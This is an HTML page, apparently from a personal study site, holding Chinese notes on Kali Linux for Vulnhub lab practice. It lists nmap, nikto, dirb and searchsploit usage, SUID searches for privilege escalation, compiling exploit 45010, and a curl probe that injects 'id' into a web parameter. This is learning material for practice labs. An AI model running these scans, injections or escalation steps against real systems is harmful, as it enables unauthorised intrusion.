@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、kali linux基础#1.1 kali linux核心系统目录#绝对路径 解释 / 根目录 /bin 存放系统启动和基础可执行命令 /sbin 存放系统管理员专用的系统管理命令 /etc 存放系统和应用程序的核心配置文件 /home 普通用户家目录的父目录 /root root超级用户的专属家目录 /usr 存放用户应用程序、共享库和渗透测试工具 /var 存放动态变化的文件（日志、缓存、数据库） /opt 大型第三方应用程序安装目录 /tmp 系统临时文件目录 /dev 硬盘设备映射文件目录 /home/用户名/.ssh/id_rsa RSA算法生成的私钥默认文件名 /var/www/html Linux系统中Apache或Nginx Web服务器存放网页文件的默认根目录 1.2 kali linux工具关键路径#用途 绝对路径 常用渗透工具执行文件 /usr/bin/ 自带爆破字典 /usr/share/wordlists/ RockyYou字典（压缩包） /usr/share/wordlists/rockyou.txt.gz Dirb常用字典 /usr/share/wordlists/dirb/common.txt Metasploit框架目录 /usr/share/metasploit-framework/ Exploit-DB漏洞库目录 /usr/share/exploitdb/ APT软件源配置文件 /etc/apt/sources.list SSH服务配置文件 /etc/ssh/sshd_config 1.3 基础命令#命令 解释 pwd 查看当前目录 hostname 查看主机名 ip a 查看网卡 cat /etc/os-release 查看系统版本 sudo -l 列出当前用户被允许以sudo身份执行的命令 sudo pip install . 以pip安装当前目录里的python包 二、基础工具#2.1 nano/vim#📝 Linux 终端编辑器常用操作对照表
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/kali-linux/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="vnccer">
+  <meta property="og:description" content="一、kali linux基础#1.1 kali linux核心系统目录#绝对路径 解释 / 根目录 /bin 存放系统启动和基础可执行命令 /sbin 存放系统管理员专用的系统管理命令 /etc 存放系统和应用程序的核心配置文件 /home 普通用户家目录的父目录 /root root超级用户的专属家目录 /usr 存放用户应用程序、共享库和渗透测试工具 /var 存放动态变化的文件（日志、缓存、数据库） /opt 大型第三方应用程序安装目录 /tmp 系统临时文件目录 /dev 硬盘设备映射文件目录 /home/用户名/.ssh/id_rsa RSA算法生成的私钥默认文件名 /var/www/html Linux系统中Apache或Nginx Web服务器存放网页文件的默认根目录 1.2 kali linux工具关键路径#用途 绝对路径 常用渗透工具执行文件 /usr/bin/ 自带爆破字典 /usr/share/wordlists/ RockyYou字典（压缩包） /usr/share/wordlists/rockyou.txt.gz Dirb常用字典 /usr/share/wordlists/dirb/common.txt Metasploit框架目录 /usr/share/metasploit-framework/ Exploit-DB漏洞库目录 /usr/share/exploitdb/ APT软件源配置文件 /etc/apt/sources.list SSH服务配置文件 /etc/ssh/sshd_config 1.3 基础命令#命令 解释 pwd 查看当前目录 hostname 查看主机名 ip a 查看网卡 cat /etc/os-release 查看系统版本 sudo -l 列出当前用户被允许以sudo身份执行的命令 sudo pip install . 以pip安装当前目录里的python包 二、基础工具#2.1 nano/vim#📝 Linux 终端编辑器常用操作对照表">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="vnccer">
+  <meta itemprop="description" content="一、kali linux基础#1.1 kali linux核心系统目录#绝对路径 解释 / 根目录 /bin 存放系统启动和基础可执行命令 /sbin 存放系统管理员专用的系统管理命令 /etc 存放系统和应用程序的核心配置文件 /home 普通用户家目录的父目录 /root root超级用户的专属家目录 /usr 存放用户应用程序、共享库和渗透测试工具 /var 存放动态变化的文件（日志、缓存、数据库） /opt 大型第三方应用程序安装目录 /tmp 系统临时文件目录 /dev 硬盘设备映射文件目录 /home/用户名/.ssh/id_rsa RSA算法生成的私钥默认文件名 /var/www/html Linux系统中Apache或Nginx Web服务器存放网页文件的默认根目录 1.2 kali linux工具关键路径#用途 绝对路径 常用渗透工具执行文件 /usr/bin/ 自带爆破字典 /usr/share/wordlists/ RockyYou字典（压缩包） /usr/share/wordlists/rockyou.txt.gz Dirb常用字典 /usr/share/wordlists/dirb/common.txt Metasploit框架目录 /usr/share/metasploit-framework/ Exploit-DB漏洞库目录 /usr/share/exploitdb/ APT软件源配置文件 /etc/apt/sources.list SSH服务配置文件 /etc/ssh/sshd_config 1.3 基础命令#命令 解释 pwd 查看当前目录 hostname 查看主机名 ip a 查看网卡 cat /etc/os-release 查看系统版本 sudo -l 列出当前用户被允许以sudo身份执行的命令 sudo pip install . 以pip安装当前目录里的python包 二、基础工具#2.1 nano/vim#📝 Linux 终端编辑器常用操作对照表">
+  <meta itemprop="wordCount" content="864">
+
+<title>Kali Linux | vnccer</title>
+<link rel="icon" href="/AK47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/kali-linux/">
+<link rel="stylesheet" href="/book.min.1e41d5678f964bf5e10529bf5ff61bf7455644d5c02d70e5a7e796dfd5819ddd.css" integrity="sha256-HkHVZ4&#43;WS/XhBSm/X/Yb90VWRNXALXDlp&#43;eW39WBnd0=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/zh.search.min.f619fc851a80bc94389cf70b5931e81a4432ab1e728be9dddd09532e5940721f.js" integrity="sha256-9hn8hRqAvJQ4nPcLWTHoGkQyqx5yi&#43;nd3QlTLllAch8=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="搜索"
+    aria-label="搜索"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛡️网安</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      Ctf</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      Vulnhub</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/DVWA/" class="">
+      Dvwa</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/kali-linux/" class="active">
+      Kali Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Beelzebub/" class="">
+      Vulnhub Beelzebub</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-earth/" class="">
+      Vulnhub Earth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Empire_Breakout/" class="">
+      Vulnhub Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Empire_lupinone/" class="">
+      Vulnhub Empire Lupinone</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-ICA_1/" class="">
+      Vulnhub Ica 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-jangow_01/" class="">
+      Vulnhub Jangow 01</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Napping-1.0.1/" class="">
+      Vulnhub Napping 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Noob_1/" class="">
+      Vulnhub Noob 1</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      📄论文</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      💼未来</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🤖AI</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛠️技能</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      ☕生活</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Kali Linux</h3>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一kali-linux基础">一、kali linux基础<a class="anchor" href="#%e4%b8%80kali-linux%e5%9f%ba%e7%a1%80">#</a></h1>
+<h2 id="11-kali-linux核心系统目录">1.1 kali linux核心系统目录<a class="anchor" href="#11-kali-linux%e6%a0%b8%e5%bf%83%e7%b3%bb%e7%bb%9f%e7%9b%ae%e5%bd%95">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>绝对路径</th>
+          <th>解释</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>/</td>
+          <td>根目录</td>
+      </tr>
+      <tr>
+          <td>/bin</td>
+          <td>存放系统启动和基础可执行命令</td>
+      </tr>
+      <tr>
+          <td>/sbin</td>
+          <td>存放系统管理员专用的系统管理命令</td>
+      </tr>
+      <tr>
+          <td>/etc</td>
+          <td>存放系统和应用程序的核心配置文件</td>
+      </tr>
+      <tr>
+          <td>/home</td>
+          <td>普通用户家目录的父目录</td>
+      </tr>
+      <tr>
+          <td>/root</td>
+          <td>root超级用户的专属家目录</td>
+      </tr>
+      <tr>
+          <td>/usr</td>
+          <td>存放用户应用程序、共享库和渗透测试工具</td>
+      </tr>
+      <tr>
+          <td>/var</td>
+          <td>存放动态变化的文件（日志、缓存、数据库）</td>
+      </tr>
+      <tr>
+          <td>/opt</td>
+          <td>大型第三方应用程序安装目录</td>
+      </tr>
+      <tr>
+          <td>/tmp</td>
+          <td>系统临时文件目录</td>
+      </tr>
+      <tr>
+          <td>/dev</td>
+          <td>硬盘设备映射文件目录</td>
+      </tr>
+      <tr>
+          <td>/home/用户名/.ssh/id_rsa</td>
+          <td>RSA算法生成的私钥默认文件名</td>
+      </tr>
+      <tr>
+          <td>/var/www/html</td>
+          <td>Linux系统中Apache或Nginx Web服务器存放网页文件的默认根目录</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="12-kali-linux工具关键路径">1.2 kali linux工具关键路径<a class="anchor" href="#12-kali-linux%e5%b7%a5%e5%85%b7%e5%85%b3%e9%94%ae%e8%b7%af%e5%be%84">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>用途</th>
+          <th>绝对路径</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>常用渗透工具执行文件</td>
+          <td>/usr/bin/</td>
+      </tr>
+      <tr>
+          <td>自带爆破字典</td>
+          <td>/usr/share/wordlists/</td>
+      </tr>
+      <tr>
+          <td>RockyYou字典（压缩包）</td>
+          <td>/usr/share/wordlists/rockyou.txt.gz</td>
+      </tr>
+      <tr>
+          <td>Dirb常用字典</td>
+          <td>/usr/share/wordlists/dirb/common.txt</td>
+      </tr>
+      <tr>
+          <td>Metasploit框架目录</td>
+          <td>/usr/share/metasploit-framework/</td>
+      </tr>
+      <tr>
+          <td>Exploit-DB漏洞库目录</td>
+          <td>/usr/share/exploitdb/</td>
+      </tr>
+      <tr>
+          <td>APT软件源配置文件</td>
+          <td>/etc/apt/sources.list</td>
+      </tr>
+      <tr>
+          <td>SSH服务配置文件</td>
+          <td>/etc/ssh/sshd_config</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="13-基础命令">1.3 基础命令<a class="anchor" href="#13-%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>命令</th>
+          <th>解释</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>pwd</td>
+          <td>查看当前目录</td>
+      </tr>
+      <tr>
+          <td>hostname</td>
+          <td>查看主机名</td>
+      </tr>
+      <tr>
+          <td>ip a</td>
+          <td>查看网卡</td>
+      </tr>
+      <tr>
+          <td>cat /etc/os-release</td>
+          <td>查看系统版本</td>
+      </tr>
+      <tr>
+          <td>sudo -l</td>
+          <td>列出当前用户被允许以sudo身份执行的命令</td>
+      </tr>
+      <tr>
+          <td>sudo pip install .</td>
+          <td>以pip安装当前目录里的python包</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="二基础工具">二、基础工具<a class="anchor" href="#%e4%ba%8c%e5%9f%ba%e7%a1%80%e5%b7%a5%e5%85%b7">#</a></h1>
+<h2 id="21-nanovim">2.1 nano/vim<a class="anchor" href="#21-nanovim">#</a></h2>
+<p>📝 Linux 终端编辑器常用操作对照表</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">功能描述</th>
+          <th style="text-align: left"><strong>Nano</strong> (简单直观)</th>
+          <th style="text-align: left"><strong>Vim</strong> (功能强大/模式化)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>打开/创建文件</strong></td>
+          <td style="text-align: left"><code>nano &lt;文件名&gt;</code></td>
+          <td style="text-align: left"><code>vim &lt;文件名&gt;</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>进入编辑模式</strong></td>
+          <td style="text-align: left">直接输入</td>
+          <td style="text-align: left">按 <code>i</code> (即 Insert 模式)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>退出编辑模式</strong></td>
+          <td style="text-align: left">(无需退出)</td>
+          <td style="text-align: left">按 <code>Esc</code> 键</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>保存文件</strong></td>
+          <td style="text-align: left"><code>Ctrl + O</code> 然后 <code>Enter</code></td>
+          <td style="text-align: left">(普通模式下) 输入 <code>:w</code> 然后 <code>Enter</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>退出编辑器</strong></td>
+          <td style="text-align: left"><code>Ctrl + X</code></td>
+          <td style="text-align: left">(普通模式下) 输入 <code>:q</code> 然后 <code>Enter</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>强制退出 (不保存)</strong></td>
+          <td style="text-align: left"><code>Ctrl + X</code> (若提示则按 <code>N</code>)</td>
+          <td style="text-align: left">(普通模式下) 输入 <code>:q!</code> 然后 <code>Enter</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>保存并退出</strong></td>
+          <td style="text-align: left"><code>Ctrl + O</code> 再 <code>Ctrl + X</code></td>
+          <td style="text-align: left">(普通模式下) 输入 <code>:wq</code> 或 <code>ZZ</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>搜索文本</strong></td>
+          <td style="text-align: left"><code>Ctrl + W</code></td>
+          <td style="text-align: left">(普通模式下) 输入 <code>/关键词</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>翻页 (上/下)</strong></td>
+          <td style="text-align: left"><code>Ctrl + Y</code> / <code>Ctrl + V</code></td>
+          <td style="text-align: left"><code>Ctrl + B</code> / <code>Ctrl + F</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>跳转到行首/行尾</strong></td>
+          <td style="text-align: left"><code>Ctrl + A</code> / <code>Ctrl + E</code></td>
+          <td style="text-align: left"><code>0</code> (数字零) / <code>$</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>删除整行</strong></td>
+          <td style="text-align: left"><code>Ctrl + K</code> (相当于剪切)</td>
+          <td style="text-align: left"><code>dd</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>撤销操作</strong></td>
+          <td style="text-align: left"><code>Alt + U</code></td>
+          <td style="text-align: left"><code>u</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>帮助菜单</strong></td>
+          <td style="text-align: left"><code>Ctrl + G</code></td>
+          <td style="text-align: left"><code>:help</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>粘贴</strong>（外部）</td>
+          <td style="text-align: left"><code>Ctrl + Shift + V</code>或鼠标右键</td>
+          <td style="text-align: left"></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>粘贴</strong>（内部）</td>
+          <td style="text-align: left"><code>Ctrl + U</code>（U代表Uncut）</td>
+          <td style="text-align: left"></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>剪切一整行</strong></td>
+          <td style="text-align: left"><code>Ctrl + K</code>（K代表Cut）</td>
+          <td style="text-align: left"></td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<p><strong>💡 使用提示：</strong></p>
+<ol>
+<li><strong>Nano：</strong> 界面下方的 <code>^</code> 符号代表键盘上的 <code>Ctrl</code> 键。</li>
+<li><strong>Vim：</strong> 如果你在 Vim 中按键没反应或“乱跑”，连按几次 <code>Esc</code> 回到普通模式即可重新输入命令。</li>
+<li><strong>权限：</strong> 修改系统文件（如 <code>/etc/hosts</code>）请务必在命令前加 <code>sudo</code>。</li>
+</ol>
+<h2 id="22-find">2.2 find<a class="anchor" href="#22-find">#</a></h2>
+<p><code>find / -perm -4000 -type f 2&gt;/dev/null</code>
+<code>/</code>指定查找的起始路径，这里是根目录，代表全盘搜索
+<code>-perm</code>代表按权限过滤，<code>-4000</code>代表SUID(Set User ID)位
+<code>-type f</code>指定只查找文件，忽略文件夹或快捷方式
+<code>2&gt;/dev/null</code>错误屏蔽（标准错误流2重定向到黑洞设备/dev/null）</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+<code>-u=s</code>，<code>u</code>代表user，<code>s</code>代表SUID（Set User ID）位</p>
+<p><code>find /usr/ -name *webbrowser*</code>
+在<code>/usr/</code>文件起始，寻找文件名包含<code>webbrowser</code>的文件，<code>*</code>是通配符，代表任何字符</p>
+<p><code>find / -name &quot;*flag*&quot;</code></p>
+<p><code>find / -group administrators 2&gt;/dev/null</code>
+查找系统中所有属于<code>administrators</code>用户组的文件或目录</p>
+<h2 id="23-ssh">2.3 ssh<a class="anchor" href="#23-ssh">#</a></h2>
+<p><code>ssh 用户名@ip地址</code></p>
+<h2 id="24-strings">2.4 strings<a class="anchor" href="#24-strings">#</a></h2>
+<p>面对一个编译后的二进制可执行文件
+<code>strings 此文件</code></p>
+<h2 id="25-vim">2.5 vim<a class="anchor" href="#25-vim">#</a></h2>
+<p>保存并退出：按<code>Esc</code>键，再输入<code>:wq</code>回车
+不保存并退出：按<code>Esc</code>键，再输入<code>:q!</code>回车</p>
+<h2 id="26-gcc">2.6 gcc<a class="anchor" href="#26-gcc">#</a></h2>
+<p><code>gcc 45010.c -o exp1</code>
+gcc是linux下的c语言编译器，<code>-o</code>是output，将此<code>.c</code>源文件编译后命名为<code>exp1</code></p>
+<h2 id="27-chmodchange-mode">2.7 chmod(change mode)<a class="anchor" href="#27-chmodchange-mode">#</a></h2>
+<p><code>chmod +x 文件名</code>，允许该文件作为一个程序被运行
+<code>chmod 777 文件名</code>，所有人都能读、写、执行
+<code>chmod u+s reset_root</code>，让程序执行时具有所有者的身份</p>
+<h2 id="28-ssh">2.8 SSH<a class="anchor" href="#28-ssh">#</a></h2>
+<p><code>ssh 用户名@ip</code> → 指纹确认 → 输入密码
+ssh相比反弹shell更稳定，ssh流量加密</p>
+<h2 id="29-ls">2.9 ls<a class="anchor" href="#29-ls">#</a></h2>
+<p><code>ls</code>仅仅看目录下文件，而<code>ls -l</code>（<code>-l</code>代表long），能显示文件的7个关键属性</p>
+<p>例如：<code>-rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 query.py</code></p>
+<table>
+  <thead>
+      <tr>
+          <th>权限位</th>
+          <th>链接数</th>
+          <th>所有者</th>
+          <th>所属组</th>
+          <th>大小</th>
+          <th>修改日期</th>
+          <th>文件名</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>-rw-rw-r&ndash;</td>
+          <td>1(节点引用)</td>
+          <td>adrian</td>
+          <td>administrators</td>
+          <td>481字节</td>
+          <td>oct 30 2021</td>
+          <td>query.py</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="三渗透工具">三、渗透工具<a class="anchor" href="#%e4%b8%89%e6%b8%97%e9%80%8f%e5%b7%a5%e5%85%b7">#</a></h1>
+<h2 id="31-arp-scan">3.1 arp-scan<a class="anchor" href="#31-arp-scan">#</a></h2>
+<p><code>sudo arp-scan -l</code></p>
+<h2 id="32-nmap端口扫描">3.2 nmap端口扫描<a class="anchor" href="#32-nmap%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f">#</a></h2>
+<p>例如</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>sudo nmap -A ip地址 <span style="color:#8b949e;font-style:italic"># 全面的系统探测</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>sudo nmap -A -p 1-65535 ip地址 <span style="color:#8b949e;font-style:italic"># 全端口的深度探测</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>sudo nmap -sS -p 1-65535 --min-rate <span style="color:#a5d6ff">5000</span> ip地址 -oN ports.txt <span style="color:#8b949e;font-style:italic"># 高速全端口扫描</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>sudo nmap -sS -Pn -p- -T4 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>sudo nmap -sS -sV -sC -T4 192.168.203.131</span></span></code></pre></div><ul>
+<li>
+<p>扫描类型与深度</p>
+<table>
+  <thead>
+      <tr>
+          <th>参数</th>
+          <th>全称</th>
+          <th>什么时候用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-sS</code></td>
+          <td>TCP SYN Scan</td>
+          <td><strong>默认必选</strong>。半开放扫描，速度快且隐蔽，不会完成TCP三次握手</td>
+      </tr>
+      <tr>
+          <td><code>-sV</code></td>
+          <td>Version Detection</td>
+          <td><strong>查版本</strong>。探测端口上运行的具体软件及其版本号</td>
+      </tr>
+      <tr>
+          <td><code>-sC</code>/<code>--script=default</code></td>
+          <td>Default Script Scan</td>
+          <td><strong>找漏洞</strong>。使用Nmap官方默认脚本检查基础配置错误或已知漏洞</td>
+      </tr>
+      <tr>
+          <td><code>-O</code></td>
+          <td>OS Detection</td>
+          <td><strong>猜系统</strong>。通过TCP/IP协议栈指纹识别目标是Linux,Windows还是嵌入式设备</td>
+      </tr>
+      <tr>
+          <td><code>-A</code></td>
+          <td>Aggressive Mode</td>
+          <td><strong>全能模式</strong>。相当于同时开启了<code>-sV</code>,<code>-sC</code>,<code>-O</code>和<code>--traceroute</code></td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>目标范围与存活判定</p>
+<table>
+  <thead>
+      <tr>
+          <th>参数</th>
+          <th>全称</th>
+          <th>什么时候用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-p-</code></td>
+          <td>All Ports</td>
+          <td><strong>全端口扫描</strong>。扫描1到65535所有端口。默认只扫描1000个常用端口</td>
+      </tr>
+      <tr>
+          <td><code>-Pn</code></td>
+          <td>No Ping</td>
+          <td><strong>对方禁ping时</strong>。绕过ICMP探测，强制直接进行端口扫描</td>
+      </tr>
+      <tr>
+          <td><code>--traceroute</code></td>
+          <td>Traceroute</td>
+          <td><strong>拓扑分析</strong>。追踪数据包到目标的路径，分析中间经过了多少层路由/防火墙</td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>性能与时间控制</p>
+<table>
+  <thead>
+      <tr>
+          <th>参数</th>
+          <th>全称</th>
+          <th>什么时候用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-T4</code></td>
+          <td>Timing Template</td>
+          <td><strong>提高速度</strong>。0-5级，T4是兼具速度与稳定性的推荐值。T5极快但容易被封</td>
+      </tr>
+      <tr>
+          <td><code>--min-rate [num]</code></td>
+          <td>Minimum Rate</td>
+          <td><strong>硬件限速</strong>。比如<code>--min-rate 1000</code>保证每秒发包不少于1000个，极大缩短全端口扫描时间</td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>结果输出</p>
+<table>
+  <thead>
+      <tr>
+          <th>参数</th>
+          <th>全称</th>
+          <th>什么时候用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-oN ports.txt</code></td>
+          <td>Normal Output</td>
+          <td><strong>存为文本</strong>。扫描结果保存为txt文件，方便后续查看或grep过滤</td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>常见场景</p>
+</li>
+</ul>
+<p>场景A：快速资产摸底（在已知网络环境下快速确定服务）
+<code>sudo nmap -sS -sV -sC -T4 目标ip</code></p>
+<p>场景B：全量深度扫描（CTF/内网渗透）（扫描所有端口，且尝试获取操作系统指纹和默认脚本漏洞）
+<code>sudo nmap -p- -A --min-rate 1000 -oN scan_report.txt 目标ip</code></p>
+<p>场景C：穿透防火墙（对方不回ping）（强制探测，且放慢速度避免被IDS拦截）
+<code>sudo nmap -Pn -sS -p 80,443,22,3389 目标ip</code></p>
+<h2 id="33-searchsploit">3.3 searchsploit<a class="anchor" href="#33-searchsploit">#</a></h2>
+<p><code>uname -a</code>查看内核版本
+<code>lsb_release -a</code>查看发行版本
+<code>searchsploit vsFTPd 3.0.3 -w</code>，扫描vsFTPd这个软件，版本号为3.0.3的有没有漏洞，<code>-w</code>是显示完整标题，或<code>--overflow</code>，不看URL，只强行展示长标题
+<code>searchsploit -m 45010</code>将45010编号的文件拷贝到当前文件夹(-m是mirror)</p>
+<h2 id="34-http扫描">3.4 HTTP扫描<a class="anchor" href="#34-http%e6%89%ab%e6%8f%8f">#</a></h2>
+<h3 id="341-curl">3.4.1 curl<a class="anchor" href="#341-curl">#</a></h3>
+<p><code>curl http://192.168.174.129/site/busque.php?buscar=id</code>
+将kali终端当作简易浏览器，向服务器请求<code>busque.php</code>这个页面，并传递参数<code>buscar=id</code>，最终在终端打印出该页面的HTML源代码</p>
+<h3 id="342-nikto服务器扫描">3.4.2 nikto服务器扫描<a class="anchor" href="#342-nikto%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%89%ab%e6%8f%8f">#</a></h3>
+<p><code>nikto -h http://192.168.174.129</code>
+nikto是web服务器扫描器，<code>-h</code>(<code>-host</code>)指定要扫描的目标主机，发现已知漏洞和配置缺陷，基于指纹库</p>
+<h3 id="343-dirb目录扫描乱">3.4.3 dirb目录扫描(乱)<a class="anchor" href="#343-dirb%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f%e4%b9%b1">#</a></h3>
+<p><code>dirb http://192.168.174.129</code>
+发现隐藏的目录和文件，基于字典</p>
